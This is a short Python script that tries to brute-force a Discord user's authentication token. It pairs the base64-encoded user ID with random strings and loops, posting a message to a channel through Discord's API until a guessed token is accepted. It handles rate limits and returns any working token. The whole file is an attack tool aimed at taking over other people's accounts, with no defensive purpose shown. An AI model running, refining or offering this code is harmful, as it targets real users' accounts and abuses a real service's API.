import time
import string
import random
import base64

import requests


# Define characters for token generation
digits = string.ascii_letters + string.digits + "-" + "_"


# Function to perform the search operation
def search(userid, channelid):
    # Function to generate random strings for token creation
    def generate():
        res2 = ''.join(random.choices(digits, k=6))
        res3 = ''.join(random.choices(digits, k=38))
        return [res2, res3]

    # Discord API URL for sending messages
    url = f'https://discord.com/api/v9/channels/{channelid}/messages'

    # Function to generate headers for the HTTP request
    def generate_headers(t):
        return {
            'User-Agent': 'Mozilla/5.0',
            'Authorization': t
        }

    # Payload for the message
    payload = {
        "content": "I am here!",
        "flags": 0,
        "mobile_network_type": "unknown",
        "tts": False
    }

    # Variable to track if the request was successful
    worked = False

    # Continue trying until the request is successful
    while not worked:
        # Generate the token in completion
        generated = generate()
        token = f"{base64.b64encode(str(userid).encode('utf-8')).decode('utf-8')}.{generated[0]}.{generated[1]}"
        headers = generate_headers(token)

        # Send the request
        response = requests.post(url, headers=headers, data=payload)

        # Check the response status code
        if response.status_code == 200:
            # Request was successful, update the variable and save the token
            worked = True
            stoken = headers.get('Authorization')
            return stoken
        if response.status_code == 429:
            # Rate limit exceeded, wait for the specified time
            retry_after = int(response.headers.get('Retry-After'))
            print(f"Sleeping for {retry_after / 60} minutes")
            time.sleep(retry_after)
        if response.status_code == 401:
            # Response failed with Token, retrying
            print(f"""Request failed with token {headers.get('Authorization')}, generating a new token...""")
        else:
            # Request failed with an unexpected status code, print information
            print(f'Request failed with exit code {response.status_code}')
            print(headers.get('Authorization'))
